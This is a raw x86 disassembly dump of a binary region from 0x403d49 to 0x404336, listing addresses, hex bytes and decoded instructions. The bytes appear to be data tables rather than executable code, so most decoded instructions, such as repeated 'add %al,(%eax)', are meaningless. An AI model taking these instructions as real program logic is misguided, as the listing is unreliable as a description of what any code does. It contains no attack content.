  403d49:	00 00                	add    %al,(%eax)
  403d4b:	00 03                	add    %al,(%ebx)
  403d4d:	00 c6                	add    %al,%dh
  403d4f:	01 b1 02 12 05 93    	add    %esi,-0x6cfaedfe(%ecx)
  403d55:	00 00                	add    %al,(%eax)
  403d57:	00 00                	add    %al,(%eax)
  403d59:	00 03                	add    %al,(%ebx)
  403d5b:	00 c6                	add    %al,%dh
  403d5d:	01 a7 02 33 04 97    	add    %esp,-0x68fbccfe(%edi)
  403d63:	00 00                	add    %al,(%eax)
  403d65:	00 00                	add    %al,(%eax)
  403d67:	00 03                	add    %al,(%ebx)
  403d69:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403d6f:	03 98 00 00 00 00    	add    0x0(%eax),%ebx
  403d75:	00 03                	add    %al,(%ebx)
  403d77:	00 c6                	add    %al,%dh
  403d79:	01 b6 02 1c 05 9a    	add    %esi,-0x65fae3fe(%esi)
  403d7f:	00 00                	add    %al,(%eax)
  403d81:	00 00                	add    %al,(%eax)
  403d83:	00 03                	add    %al,(%ebx)
  403d85:	00 c6                	add    %al,%dh
  403d87:	01 b1 02 26 05 9f    	add    %esi,-0x60fad9fe(%ecx)
  403d8d:	00 00                	add    %al,(%eax)
  403d8f:	00 00                	add    %al,(%eax)
  403d91:	00 03                	add    %al,(%ebx)
  403d93:	00 c6                	add    %al,%dh
  403d95:	01 a7 02 34 05 a6    	add    %esp,-0x59facbfe(%edi)
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	00 00                	add    %al,(%eax)
  403d9f:	00 03                	add    %al,(%ebx)
  403da1:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403da7:	03 a8 00 00 00 00    	add    0x0(%eax),%ebp
  403dad:	00 03                	add    %al,(%ebx)
  403daf:	00 c6                	add    %al,%dh
  403db1:	01 b6 02 3c 05 aa    	add    %esi,-0x55fac3fe(%esi)
  403db7:	00 00                	add    %al,(%eax)
  403db9:	00 00                	add    %al,(%eax)
  403dbb:	00 03                	add    %al,(%ebx)
  403dbd:	00 c6                	add    %al,%dh
  403dbf:	01 b1 02 f3 04 ab    	add    %esi,-0x54fb0cfe(%ecx)
  403dc5:	00 00                	add    %al,(%eax)
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	00 03                	add    %al,(%ebx)
  403dcb:	00 c6                	add    %al,%dh
  403dcd:	01 a7 02 41 05 ae    	add    %esp,-0x51fabefe(%edi)
  403dd3:	00 00                	add    %al,(%eax)
  403dd5:	00 00                	add    %al,(%eax)
  403dd7:	00 03                	add    %al,(%ebx)
  403dd9:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403ddf:	03 af 00 00 00 00    	add    0x0(%edi),%ebp
  403de5:	00 03                	add    %al,(%ebx)
  403de7:	00 c6                	add    %al,%dh
  403de9:	01 b6 02 47 05 b1    	add    %esi,-0x4efab8fe(%esi)
  403def:	00 00                	add    %al,(%eax)
  403df1:	00 00                	add    %al,(%eax)
  403df3:	00 03                	add    %al,(%ebx)
  403df5:	00 c6                	add    %al,%dh
  403df7:	01 b1 02 4d 05 b3    	add    %esi,-0x4cfab2fe(%ecx)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	00 00                	add    %al,(%eax)
  403e01:	00 03                	add    %al,(%ebx)
  403e03:	00 c6                	add    %al,%dh
  403e05:	01 a7 02 33 04 b7    	add    %esp,-0x48fbccfe(%edi)
  403e0b:	00 00                	add    %al,(%eax)
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	00 03                	add    %al,(%ebx)
  403e11:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403e17:	03 b8 00 00 00 00    	add    0x0(%eax),%edi
  403e1d:	00 03                	add    %al,(%ebx)
  403e1f:	00 c6                	add    %al,%dh
  403e21:	01 b6 02 57 05 ba    	add    %esi,-0x45faa8fe(%esi)
  403e27:	00 00                	add    %al,(%eax)
  403e29:	00 00                	add    %al,(%eax)
  403e2b:	00 03                	add    %al,(%ebx)
  403e2d:	00 c6                	add    %al,%dh
  403e2f:	01 b1 02 60 05 be    	add    %esi,-0x41fa9ffe(%ecx)
  403e35:	00 00                	add    %al,(%eax)
  403e37:	00 00                	add    %al,(%eax)
  403e39:	00 03                	add    %al,(%ebx)
  403e3b:	00 c6                	add    %al,%dh
  403e3d:	01 a7 02 e6 04 c4    	add    %esp,-0x3bfb19fe(%edi)
  403e43:	00 00                	add    %al,(%eax)
  403e45:	00 01                	add    %al,(%ecx)
  403e47:	00 3e                	add    %bh,(%esi)
  403e49:	01 00                	add    %eax,(%eax)
  403e4b:	00 02                	add    %al,(%edx)
  403e4d:	00 d6                	add    %dl,%dh
  403e4f:	09 00                	or     %eax,(%eax)
  403e51:	00 01                	add    %al,(%ecx)
  403e53:	00 3e                	add    %bh,(%esi)
  403e55:	01 00                	add    %eax,(%eax)
  403e57:	00 02                	add    %al,(%edx)
  403e59:	00 d6                	add    %dl,%dh
  403e5b:	09 00                	or     %eax,(%eax)
  403e5d:	00 01                	add    %al,(%ecx)
  403e5f:	00 3e                	add    %bh,(%esi)
  403e61:	01 00                	add    %eax,(%eax)
  403e63:	00 02                	add    %al,(%edx)
  403e65:	00 d6                	add    %dl,%dh
  403e67:	09 00                	or     %eax,(%eax)
  403e69:	00 01                	add    %al,(%ecx)
  403e6b:	00 39                	add    %bh,(%ecx)
  403e6d:	03 00                	add    (%eax),%eax
  403e6f:	00 02                	add    %al,(%edx)
  403e71:	00 41 03             	add    %al,0x3(%ecx)
  403e74:	00 00                	add    %al,(%eax)
  403e76:	01 00                	add    %eax,(%eax)
  403e78:	83 03 00             	addl   $0x0,(%ebx)
  403e7b:	00 01                	add    %al,(%ecx)
  403e7d:	00 83 03 00 00 01    	add    %al,0x1000003(%ebx)
  403e83:	00 49 09             	add    %cl,0x9(%ecx)
  403e86:	00 00                	add    %al,(%eax)
  403e88:	01 00                	add    %eax,(%eax)
  403e8a:	49                   	dec    %ecx
  403e8b:	09 00                	or     %eax,(%eax)
  403e8d:	00 02                	add    %al,(%edx)
  403e8f:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  403e92:	00 00                	add    %al,(%eax)
  403e94:	01 00                	add    %eax,(%eax)
  403e96:	49                   	dec    %ecx
  403e97:	09 00                	or     %eax,(%eax)
  403e99:	00 01                	add    %al,(%ecx)
  403e9b:	00 17                	add    %dl,(%edi)
  403e9d:	09 00                	or     %eax,(%eax)
  403e9f:	00 02                	add    %al,(%edx)
  403ea1:	00 41 09             	add    %al,0x9(%ecx)
  403ea4:	00 00                	add    %al,(%eax)
  403ea6:	01 00                	add    %eax,(%eax)
  403ea8:	49                   	dec    %ecx
  403ea9:	09 00                	or     %eax,(%eax)
  403eab:	00 02                	add    %al,(%edx)
  403ead:	00 c2                	add    %al,%dl
  403eaf:	0e                   	push   %cs
  403eb0:	00 00                	add    %al,(%eax)
  403eb2:	01 00                	add    %eax,(%eax)
  403eb4:	62 0d 00 00 01 00    	bound  %ecx,0x10000
  403eba:	49                   	dec    %ecx
  403ebb:	09 00                	or     %eax,(%eax)
  403ebd:	00 02                	add    %al,(%edx)
  403ebf:	00 1f                	add    %bl,(%edi)
  403ec1:	09 00                	or     %eax,(%eax)
  403ec3:	00 01                	add    %al,(%ecx)
  403ec5:	00 35 09 00 00 01    	add    %dh,0x1000009
  403ecb:	00 36                	add    %dh,(%esi)
  403ecd:	0c 00                	or     $0x0,%al
  403ecf:	00 02                	add    %al,(%edx)
  403ed1:	00 ac 08 00 00 01 00 	add    %ch,0x10000(%eax,%ecx,1)
  403ed8:	36 0c 00             	ss or  $0x0,%al
  403edb:	00 02                	add    %al,(%edx)
  403edd:	00 ac 08 00 00 01 00 	add    %ch,0x10000(%eax,%ecx,1)
  403ee4:	36 0c 00             	ss or  $0x0,%al
  403ee7:	00 02                	add    %al,(%edx)
  403ee9:	00 ac 08 00 00 01 00 	add    %ch,0x10000(%eax,%ecx,1)
  403ef0:	66 01 00             	add    %ax,(%eax)
  403ef3:	00 02                	add    %al,(%edx)
  403ef5:	00 76 10             	add    %dh,0x10(%esi)
  403ef8:	00 00                	add    %al,(%eax)
  403efa:	01 00                	add    %eax,(%eax)
  403efc:	12 08                	adc    (%eax),%cl
  403efe:	00 00                	add    %al,(%eax)
  403f00:	01 00                	add    %eax,(%eax)
  403f02:	12 10                	adc    (%eax),%dl
  403f04:	00 00                	add    %al,(%eax)
  403f06:	02 00                	add    (%eax),%al
  403f08:	11 02                	adc    %eax,(%edx)
  403f0a:	00 00                	add    %al,(%eax)
  403f0c:	01 00                	add    %eax,(%eax)
  403f0e:	79 09                	jns    0x403f19
  403f10:	00 00                	add    %al,(%eax)
  403f12:	02 00                	add    (%eax),%al
  403f14:	12 10                	adc    (%eax),%dl
  403f16:	00 00                	add    %al,(%eax)
  403f18:	01 00                	add    %eax,(%eax)
  403f1a:	d4 10                	aam    $0x10
  403f1c:	00 00                	add    %al,(%eax)
  403f1e:	01 00                	add    %eax,(%eax)
  403f20:	12 10                	adc    (%eax),%dl
  403f22:	00 00                	add    %al,(%eax)
  403f24:	02 00                	add    (%eax),%al
  403f26:	11 02                	adc    %eax,(%edx)
  403f28:	00 00                	add    %al,(%eax)
  403f2a:	01 00                	add    %eax,(%eax)
  403f2c:	13 03                	adc    (%ebx),%eax
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	02 00                	add    (%eax),%al
  403f32:	8e 03                	mov    (%ebx),%es
  403f34:	00 00                	add    %al,(%eax)
  403f36:	03 00                	add    (%eax),%eax
  403f38:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403f39:	11 00                	adc    %eax,(%eax)
  403f3b:	00 04 00             	add    %al,(%eax,%eax,1)
  403f3e:	f9                   	stc
  403f3f:	03 00                	add    (%eax),%eax
  403f41:	00 05 00 27 01 00    	add    %al,0x12700
  403f47:	00 06                	add    %al,(%esi)
  403f49:	00 9e 08 00 00 01    	add    %bl,0x1000008(%esi)
  403f4f:	00 13                	add    %dl,(%ebx)
  403f51:	03 00                	add    (%eax),%eax
  403f53:	00 02                	add    %al,(%edx)
  403f55:	00 8e 03 00 00 03    	add    %cl,0x3000003(%esi)
  403f5b:	00 a6 11 00 00 04    	add    %ah,0x4000011(%esi)
  403f61:	00 f9                	add    %bh,%cl
  403f63:	03 00                	add    (%eax),%eax
  403f65:	00 05 00 27 01 00    	add    %al,0x12700
  403f6b:	00 06                	add    %al,(%esi)
  403f6d:	00 9e 08 00 00 07    	add    %bl,0x7000008(%esi)
  403f73:	00 79 09             	add    %bh,0x9(%ecx)
  403f76:	00 00                	add    %al,(%eax)
  403f78:	08 00                	or     %al,(%eax)
  403f7a:	12 10                	adc    (%eax),%dl
  403f7c:	00 00                	add    %al,(%eax)
  403f7e:	01 00                	add    %eax,(%eax)
  403f80:	8e 03                	mov    (%ebx),%es
  403f82:	00 00                	add    %al,(%eax)
  403f84:	02 00                	add    (%eax),%al
  403f86:	d4 10                	aam    $0x10
  403f88:	00 00                	add    %al,(%eax)
  403f8a:	01 00                	add    %eax,(%eax)
  403f8c:	12 10                	adc    (%eax),%dl
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	02 00                	add    (%eax),%al
  403f92:	11 02                	adc    %eax,(%edx)
  403f94:	00 00                	add    %al,(%eax)
  403f96:	01 00                	add    %eax,(%eax)
  403f98:	d5 02                	aad    $0x2
  403f9a:	00 00                	add    %al,(%eax)
  403f9c:	02 00                	add    (%eax),%al
  403f9e:	f9                   	stc
  403f9f:	09 00                	or     %eax,(%eax)
  403fa1:	00 01                	add    %al,(%ecx)
  403fa3:	00 d5                	add    %dl,%ch
  403fa5:	02 00                	add    (%eax),%al
  403fa7:	00 02                	add    %al,(%edx)
  403fa9:	00 f9                	add    %bh,%cl
  403fab:	09 00                	or     %eax,(%eax)
  403fad:	00 03                	add    %al,(%ebx)
  403faf:	00 79 09             	add    %bh,0x9(%ecx)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	04 00                	add    $0x0,%al
  403fb6:	12 10                	adc    (%eax),%dl
  403fb8:	00 00                	add    %al,(%eax)
  403fba:	01 00                	add    %eax,(%eax)
  403fbc:	f9                   	stc
  403fbd:	09 00                	or     %eax,(%eax)
  403fbf:	00 02                	add    %al,(%edx)
  403fc1:	00 d4                	add    %dl,%ah
  403fc3:	10 00                	adc    %al,(%eax)
  403fc5:	00 01                	add    %al,(%ecx)
  403fc7:	00 12                	add    %dl,(%edx)
  403fc9:	10 00                	adc    %al,(%eax)
  403fcb:	00 02                	add    %al,(%edx)
  403fcd:	00 11                	add    %dl,(%ecx)
  403fcf:	02 00                	add    (%eax),%al
  403fd1:	00 01                	add    %al,(%ecx)
  403fd3:	00 a3 03 00 00 02    	add    %ah,0x2000003(%ebx)
  403fd9:	00 c8                	add    %cl,%al
  403fdb:	03 00                	add    (%eax),%eax
  403fdd:	00 03                	add    %al,(%ebx)
  403fdf:	00 99 0e 00 00 04    	add    %bl,0x400000e(%ecx)
  403fe5:	00 60 0e             	add    %ah,0xe(%eax)
  403fe8:	00 00                	add    %al,(%eax)
  403fea:	05 00 50 0e 00       	add    $0xe5000,%eax
  403fef:	00 06                	add    %al,(%esi)
  403ff1:	00 f9                	add    %bh,%cl
  403ff3:	0e                   	push   %cs
  403ff4:	00 00                	add    %al,(%eax)
  403ff6:	07                   	pop    %es
  403ff7:	00 e5                	add    %ah,%ch
  403ff9:	10 00                	adc    %al,(%eax)
  403ffb:	00 08                	add    %cl,(%eax)
  403ffd:	00 21                	add    %ah,(%ecx)
  403fff:	12 00                	adc    (%eax),%al
  404001:	00 09                	add    %cl,(%ecx)
  404003:	00 94 0b 02 00 0a 00 	add    %dl,0xa0002(%ebx,%ecx,1)
  40400a:	d7                   	xlat   %ds:(%ebx)
  40400b:	0a 00                	or     (%eax),%al
  40400d:	00 01                	add    %al,(%ecx)
  40400f:	00 a3 03 00 00 02    	add    %ah,0x2000003(%ebx)
  404015:	00 c8                	add    %cl,%al
  404017:	03 00                	add    (%eax),%eax
  404019:	00 03                	add    %al,(%ebx)
  40401b:	00 99 0e 00 00 04    	add    %bl,0x400000e(%ecx)
  404021:	00 60 0e             	add    %ah,0xe(%eax)
  404024:	00 00                	add    %al,(%eax)
  404026:	05 00 50 0e 00       	add    $0xe5000,%eax
  40402b:	00 06                	add    %al,(%esi)
  40402d:	00 f9                	add    %bh,%cl
  40402f:	0e                   	push   %cs
  404030:	00 00                	add    %al,(%eax)
  404032:	07                   	pop    %es
  404033:	00 e5                	add    %ah,%ch
  404035:	10 00                	adc    %al,(%eax)
  404037:	00 08                	add    %cl,(%eax)
  404039:	00 21                	add    %ah,(%ecx)
  40403b:	12 00                	adc    (%eax),%al
  40403d:	00 09                	add    %cl,(%ecx)
  40403f:	00 94 0b 02 00 0a 00 	add    %dl,0xa0002(%ebx,%ecx,1)
  404046:	d7                   	xlat   %ds:(%ebx)
  404047:	0a 00                	or     (%eax),%al
  404049:	00 0b                	add    %cl,(%ebx)
  40404b:	00 79 09             	add    %bh,0x9(%ecx)
  40404e:	00 00                	add    %al,(%eax)
  404050:	0c 00                	or     $0x0,%al
  404052:	12 10                	adc    (%eax),%dl
  404054:	00 00                	add    %al,(%eax)
  404056:	01 00                	add    %eax,(%eax)
  404058:	94                   	xchg   %eax,%esp
  404059:	0b 02                	or     (%edx),%eax
  40405b:	00 02                	add    %al,(%edx)
  40405d:	00 d7                	add    %dl,%bh
  40405f:	0a 00                	or     (%eax),%al
  404061:	00 03                	add    %al,(%ebx)
  404063:	00 d4                	add    %dl,%ah
  404065:	10 00                	adc    %al,(%eax)
  404067:	00 01                	add    %al,(%ecx)
  404069:	00 12                	add    %dl,(%edx)
  40406b:	10 00                	adc    %al,(%eax)
  40406d:	00 02                	add    %al,(%edx)
  40406f:	00 11                	add    %dl,(%ecx)
  404071:	02 00                	add    (%eax),%al
  404073:	00 01                	add    %al,(%ecx)
  404075:	00 6a 03             	add    %ch,0x3(%edx)
  404078:	00 00                	add    %al,(%eax)
  40407a:	02 00                	add    (%eax),%al
  40407c:	bb 0f 00 00 03       	mov    $0x300000f,%ebx
  404081:	00 73 02             	add    %dh,0x2(%ebx)
  404084:	00 00                	add    %al,(%eax)
  404086:	04 00                	add    $0x0,%al
  404088:	ad                   	lods   %ds:(%esi),%eax
  404089:	0e                   	push   %cs
  40408a:	00 00                	add    %al,(%eax)
  40408c:	05 00 28 0b 00       	add    $0xb2800,%eax
  404091:	00 06                	add    %al,(%esi)
  404093:	00 73 0e             	add    %dh,0xe(%ebx)
  404096:	00 00                	add    %al,(%eax)
  404098:	07                   	pop    %es
  404099:	00 1d 03 00 00 01    	add    %bl,0x1000003
  40409f:	00 6a 03             	add    %ch,0x3(%edx)
  4040a2:	00 00                	add    %al,(%eax)
  4040a4:	02 00                	add    (%eax),%al
  4040a6:	bb 0f 00 00 03       	mov    $0x300000f,%ebx
  4040ab:	00 73 02             	add    %dh,0x2(%ebx)
  4040ae:	00 00                	add    %al,(%eax)
  4040b0:	04 00                	add    $0x0,%al
  4040b2:	ad                   	lods   %ds:(%esi),%eax
  4040b3:	0e                   	push   %cs
  4040b4:	00 00                	add    %al,(%eax)
  4040b6:	05 00 28 0b 00       	add    $0xb2800,%eax
  4040bb:	00 06                	add    %al,(%esi)
  4040bd:	00 73 0e             	add    %dh,0xe(%ebx)
  4040c0:	00 00                	add    %al,(%eax)
  4040c2:	07                   	pop    %es
  4040c3:	00 1d 03 00 00 08    	add    %bl,0x8000003
  4040c9:	00 79 09             	add    %bh,0x9(%ecx)
  4040cc:	00 00                	add    %al,(%eax)
  4040ce:	09 00                	or     %eax,(%eax)
  4040d0:	12 10                	adc    (%eax),%dl
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	01 00                	add    %eax,(%eax)
  4040d6:	d4 10                	aam    $0x10
  4040d8:	00 00                	add    %al,(%eax)
  4040da:	01 00                	add    %eax,(%eax)
  4040dc:	12 10                	adc    (%eax),%dl
  4040de:	00 00                	add    %al,(%eax)
  4040e0:	02 00                	add    (%eax),%al
  4040e2:	11 02                	adc    %eax,(%edx)
  4040e4:	00 00                	add    %al,(%eax)
  4040e6:	01 00                	add    %eax,(%eax)
  4040e8:	2b 03                	sub    (%ebx),%eax
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	02 00                	add    (%eax),%al
  4040ee:	6b 0c 00 00          	imul   $0x0,(%eax,%eax,1),%ecx
  4040f2:	03 00                	add    (%eax),%eax
  4040f4:	cc                   	int3
  4040f5:	05 02 00 04 00       	add    $0x40002,%eax
  4040fa:	78 0a                	js     0x404106
  4040fc:	00 00                	add    %al,(%eax)
  4040fe:	05 00 c1 01 00       	add    $0x1c100,%eax
  404103:	00 01                	add    %al,(%ecx)
  404105:	00 2b                	add    %ch,(%ebx)
  404107:	03 00                	add    (%eax),%eax
  404109:	00 02                	add    %al,(%edx)
  40410b:	00 6b 0c             	add    %ch,0xc(%ebx)
  40410e:	00 00                	add    %al,(%eax)
  404110:	03 00                	add    (%eax),%eax
  404112:	cc                   	int3
  404113:	05 02 00 04 00       	add    $0x40002,%eax
  404118:	78 0a                	js     0x404124
  40411a:	00 00                	add    %al,(%eax)
  40411c:	05 00 c1 01 00       	add    $0x1c100,%eax
  404121:	00 06                	add    %al,(%esi)
  404123:	00 79 09             	add    %bh,0x9(%ecx)
  404126:	00 00                	add    %al,(%eax)
  404128:	07                   	pop    %es
  404129:	00 12                	add    %dl,(%edx)
  40412b:	10 02                	adc    %al,(%edx)
  40412d:	00 01                	add    %al,(%ecx)
  40412f:	00 78 0a             	add    %bh,0xa(%eax)
  404132:	00 00                	add    %al,(%eax)
  404134:	02 00                	add    (%eax),%al
  404136:	d4 10                	aam    $0x10
  404138:	00 00                	add    %al,(%eax)
  40413a:	01 00                	add    %eax,(%eax)
  40413c:	12 10                	adc    (%eax),%dl
  40413e:	00 00                	add    %al,(%eax)
  404140:	02 00                	add    (%eax),%al
  404142:	11 02                	adc    %eax,(%edx)
  404144:	00 00                	add    %al,(%eax)
  404146:	01 00                	add    %eax,(%eax)
  404148:	0a 10                	or     (%eax),%dl
  40414a:	00 00                	add    %al,(%eax)
  40414c:	01 00                	add    %eax,(%eax)
  40414e:	0a 10                	or     (%eax),%dl
  404150:	00 00                	add    %al,(%eax)
  404152:	02 00                	add    (%eax),%al
  404154:	79 09                	jns    0x40415f
  404156:	00 00                	add    %al,(%eax)
  404158:	03 00                	add    (%eax),%eax
  40415a:	12 10                	adc    (%eax),%dl
  40415c:	00 00                	add    %al,(%eax)
  40415e:	01 00                	add    %eax,(%eax)
  404160:	d4 10                	aam    $0x10
  404162:	00 00                	add    %al,(%eax)
  404164:	01 00                	add    %eax,(%eax)
  404166:	12 10                	adc    (%eax),%dl
  404168:	00 00                	add    %al,(%eax)
  40416a:	02 00                	add    (%eax),%al
  40416c:	11 02                	adc    %eax,(%edx)
  40416e:	00 00                	add    %al,(%eax)
  404170:	01 00                	add    %eax,(%eax)
  404172:	98                   	cwtl
  404173:	03 00                	add    (%eax),%eax
  404175:	00 02                	add    %al,(%edx)
  404177:	00 ad 0e 00 00 01    	add    %ch,0x100000e(%ebp)
  40417d:	00 98 03 00 00 02    	add    %bl,0x2000003(%eax)
  404183:	00 ad 0e 00 00 03    	add    %ch,0x300000e(%ebp)
  404189:	00 79 09             	add    %bh,0x9(%ecx)
  40418c:	00 00                	add    %al,(%eax)
  40418e:	04 00                	add    $0x0,%al
  404190:	12 10                	adc    (%eax),%dl
  404192:	00 00                	add    %al,(%eax)
  404194:	01 00                	add    %eax,(%eax)
  404196:	d4 10                	aam    $0x10
  404198:	00 00                	add    %al,(%eax)
  40419a:	01 00                	add    %eax,(%eax)
  40419c:	12 10                	adc    (%eax),%dl
  40419e:	00 00                	add    %al,(%eax)
  4041a0:	02 00                	add    (%eax),%al
  4041a2:	11 02                	adc    %eax,(%edx)
  4041a4:	00 00                	add    %al,(%eax)
  4041a6:	01 00                	add    %eax,(%eax)
  4041a8:	6a 03                	push   $0x3
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	02 00                	add    (%eax),%al
  4041ae:	88 0e                	mov    %cl,(%esi)
  4041b0:	00 00                	add    %al,(%eax)
  4041b2:	01 00                	add    %eax,(%eax)
  4041b4:	6a 03                	push   $0x3
  4041b6:	00 00                	add    %al,(%eax)
  4041b8:	02 00                	add    (%eax),%al
  4041ba:	88 0e                	mov    %cl,(%esi)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	03 00                	add    (%eax),%eax
  4041c0:	79 09                	jns    0x4041cb
  4041c2:	00 00                	add    %al,(%eax)
  4041c4:	04 00                	add    $0x0,%al
  4041c6:	12 10                	adc    (%eax),%dl
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	01 00                	add    %eax,(%eax)
  4041cc:	d4 10                	aam    $0x10
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	01 00                	add    %eax,(%eax)
  4041d2:	12 10                	adc    (%eax),%dl
  4041d4:	00 00                	add    %al,(%eax)
  4041d6:	02 00                	add    (%eax),%al
  4041d8:	11 02                	adc    %eax,(%edx)
  4041da:	00 00                	add    %al,(%eax)
  4041dc:	01 00                	add    %eax,(%eax)
  4041de:	f1                   	int1
  4041df:	11 00                	adc    %eax,(%eax)
  4041e1:	00 02                	add    %al,(%edx)
  4041e3:	00 e8                	add    %ch,%al
  4041e5:	11 00                	adc    %eax,(%eax)
  4041e7:	00 03                	add    %al,(%ebx)
  4041e9:	00 95 0f 00 00 04    	add    %dl,0x400000f(%ebp)
  4041ef:	00 ce                	add    %cl,%dh
  4041f1:	01 00                	add    %eax,(%eax)
  4041f3:	00 05 00 b9 10 00    	add    %al,0x10b900
  4041f9:	00 01                	add    %al,(%ecx)
  4041fb:	00 f1                	add    %dh,%cl
  4041fd:	11 00                	adc    %eax,(%eax)
  4041ff:	00 02                	add    %al,(%edx)
  404201:	00 e8                	add    %ch,%al
  404203:	11 00                	adc    %eax,(%eax)
  404205:	00 03                	add    %al,(%ebx)
  404207:	00 95 0f 00 00 04    	add    %dl,0x400000f(%ebp)
  40420d:	00 ce                	add    %cl,%dh
  40420f:	01 00                	add    %eax,(%eax)
  404211:	00 05 00 b9 10 00    	add    %al,0x10b900
  404217:	00 06                	add    %al,(%esi)
  404219:	00 79 09             	add    %bh,0x9(%ecx)
  40421c:	00 00                	add    %al,(%eax)
  40421e:	07                   	pop    %es
  40421f:	00 12                	add    %dl,(%edx)
  404221:	10 00                	adc    %al,(%eax)
  404223:	00 01                	add    %al,(%ecx)
  404225:	00 b9 10 00 00 02    	add    %bh,0x2000010(%ecx)
  40422b:	00 d4                	add    %dl,%ah
  40422d:	10 00                	adc    %al,(%eax)
  40422f:	00 01                	add    %al,(%ecx)
  404231:	00 12                	add    %dl,(%edx)
  404233:	10 00                	adc    %al,(%eax)
  404235:	00 02                	add    %al,(%edx)
  404237:	00 11                	add    %dl,(%ecx)
  404239:	02 00                	add    (%eax),%al
  40423b:	00 01                	add    %al,(%ecx)
  40423d:	00 f1                	add    %dh,%cl
  40423f:	11 00                	adc    %eax,(%eax)
  404241:	00 01                	add    %al,(%ecx)
  404243:	00 f1                	add    %dh,%cl
  404245:	11 00                	adc    %eax,(%eax)
  404247:	00 02                	add    %al,(%edx)
  404249:	00 79 09             	add    %bh,0x9(%ecx)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	03 00                	add    (%eax),%eax
  404250:	12 10                	adc    (%eax),%dl
  404252:	00 00                	add    %al,(%eax)
  404254:	01 00                	add    %eax,(%eax)
  404256:	d4 10                	aam    $0x10
  404258:	00 00                	add    %al,(%eax)
  40425a:	01 00                	add    %eax,(%eax)
  40425c:	12 10                	adc    (%eax),%dl
  40425e:	00 00                	add    %al,(%eax)
  404260:	02 00                	add    (%eax),%al
  404262:	11 02                	adc    %eax,(%edx)
  404264:	00 00                	add    %al,(%eax)
  404266:	01 00                	add    %eax,(%eax)
  404268:	57                   	push   %edi
  404269:	03 00                	add    (%eax),%eax
  40426b:	00 02                	add    %al,(%edx)
  40426d:	00 75 03             	add    %dh,0x3(%ebp)
  404270:	00 00                	add    %al,(%eax)
  404272:	01 00                	add    %eax,(%eax)
  404274:	57                   	push   %edi
  404275:	03 00                	add    (%eax),%eax
  404277:	00 02                	add    %al,(%edx)
  404279:	00 75 03             	add    %dh,0x3(%ebp)
  40427c:	00 00                	add    %al,(%eax)
  40427e:	03 00                	add    (%eax),%eax
  404280:	79 09                	jns    0x40428b
  404282:	00 00                	add    %al,(%eax)
  404284:	04 00                	add    $0x0,%al
  404286:	12 10                	adc    (%eax),%dl
  404288:	00 00                	add    %al,(%eax)
  40428a:	01 00                	add    %eax,(%eax)
  40428c:	d4 10                	aam    $0x10
  40428e:	00 00                	add    %al,(%eax)
  404290:	01 00                	add    %eax,(%eax)
  404292:	12 10                	adc    (%eax),%dl
  404294:	00 00                	add    %al,(%eax)
  404296:	02 00                	add    (%eax),%al
  404298:	11 02                	adc    %eax,(%edx)
  40429a:	00 00                	add    %al,(%eax)
  40429c:	01 00                	add    %eax,(%eax)
  40429e:	e3 0f                	jecxz  0x4042af
  4042a0:	00 00                	add    %al,(%eax)
  4042a2:	02 00                	add    (%eax),%al
  4042a4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4042a5:	08 00                	or     %al,(%eax)
  4042a7:	00 03                	add    %al,(%ebx)
  4042a9:	00 5a 10             	add    %bl,0x10(%edx)
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	04 00                	add    $0x0,%al
  4042b0:	4b                   	dec    %ebx
  4042b1:	10 00                	adc    %al,(%eax)
  4042b3:	00 01                	add    %al,(%ecx)
  4042b5:	00 e3                	add    %ah,%bl
  4042b7:	0f 00 00             	sldt   (%eax)
  4042ba:	02 00                	add    (%eax),%al
  4042bc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4042bd:	08 00                	or     %al,(%eax)
  4042bf:	00 03                	add    %al,(%ebx)
  4042c1:	00 5a 10             	add    %bl,0x10(%edx)
  4042c4:	02 00                	add    (%eax),%al
  4042c6:	04 00                	add    $0x0,%al
  4042c8:	4b                   	dec    %ebx
  4042c9:	10 00                	adc    %al,(%eax)
  4042cb:	00 05 00 79 09 00    	add    %al,0x97900
  4042d1:	00 06                	add    %al,(%esi)
  4042d3:	00 12                	add    %dl,(%edx)
  4042d5:	10 02                	adc    %al,(%edx)
  4042d7:	00 01                	add    %al,(%ecx)
  4042d9:	00 4b 10             	add    %cl,0x10(%ebx)
  4042dc:	00 00                	add    %al,(%eax)
  4042de:	02 00                	add    (%eax),%al
  4042e0:	d4 10                	aam    $0x10
  4042e2:	04 00                	add    $0x0,%al
  4042e4:	a1 00 09 00 1a       	mov    0x1a000900,%eax
  4042e9:	0d 01 00 11 00       	or     $0x110001,%eax
  4042ee:	1a 0d 06 00 19 00    	sbb    0x190006,%cl
  4042f4:	1a 0d 0a 00 29 00    	sbb    0x29000a,%cl
  4042fa:	1a 0d 10 00 31 00    	sbb    0x310010,%cl
  404300:	1a 0d 10 00 39 00    	sbb    0x390010,%cl
  404306:	1a 0d 10 00 41 00    	sbb    0x410010,%cl
  40430c:	1a 0d 10 00 49 00    	sbb    0x490010,%cl
  404312:	1a 0d 10 00 51 00    	sbb    0x510010,%cl
  404318:	1a 0d 10 00 59 00    	sbb    0x590010,%cl
  40431e:	1a 0d 10 00 61 00    	sbb    0x610010,%cl
  404324:	1a 0d 15 00 71 00    	sbb    0x710015,%cl
  40432a:	1a 0d 1a 00 79 00    	sbb    0x79001a,%cl
  404330:	1a 0d 10 00 81 00    	sbb    0x810010,%cl
  404336:	1a 0d 10 00 b9 00    	sbb    0xb90010,%cl
